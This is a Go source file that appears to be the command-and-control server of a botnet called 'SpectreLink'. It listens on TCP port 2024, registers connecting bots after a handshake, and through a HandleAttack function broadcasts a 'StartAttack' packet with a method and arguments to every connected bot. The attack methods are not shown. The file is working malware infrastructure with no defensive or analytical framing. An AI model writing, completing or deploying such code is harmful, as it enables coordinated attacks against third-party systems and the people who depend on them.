package bot

import (
	"SpectreLink/bot/proto"
	"SpectreLink/log"
	"net"
	"sync"
)

type Server struct {
	bots *sync.Map
}

func NewServer() *Server {
	return &Server{
		bots: new(sync.Map),
	}
}

func (s *Server) ListenAndServe(wg *sync.WaitGroup) {
	defer wg.Done()

	listen, err := net.Listen("tcp", ":2024")
	if err != nil {
		panic(err)
	}

	for {
		conn, err := listen.Accept()
		if err != nil {
			panic(err)
		}

		go s.handleConnection(conn)
	}
}

func (s *Server) handleConnection(c net.Conn) {
	addr := c.RemoteAddr().String()
	host, _, _ := net.SplitHostPort(addr)

	conn := proto.NewProtoConnection(c)

	defer func() {
		if err := conn.Close(); err != nil {
			log.Exception(err)
		}

		s.bots.Delete(host)
	}()

	bot := NewBot(conn)

	if err := bot.ReadHandshake(); err != nil {
		log.Exception(err)
		return
	}

	s.bots.Store(host, bot)

	log.Infof("Bot connected: %s", host)
	defer log.Infof("Bot disconnected: %s", host)

	for packet := bot.ReadPacket(); packet != nil; packet = bot.ReadPacket() {
		log.Infof("Packet: %v", packet)
	}

}

func (s *Server) HandleAttack(name string, m map[string]string) error {
	log.Infof("Attack: %s", name)
	s.bots.Range(func(key, value interface{}) bool {
		bot := value.(*Bot)
		bot.WritePacket(proto.NewPacket(proto.PacketTypeStartAttack, map[string]interface{}{
			"Method": name,
			"Args":   m,
		}))
		return true
	})

	return nil
}
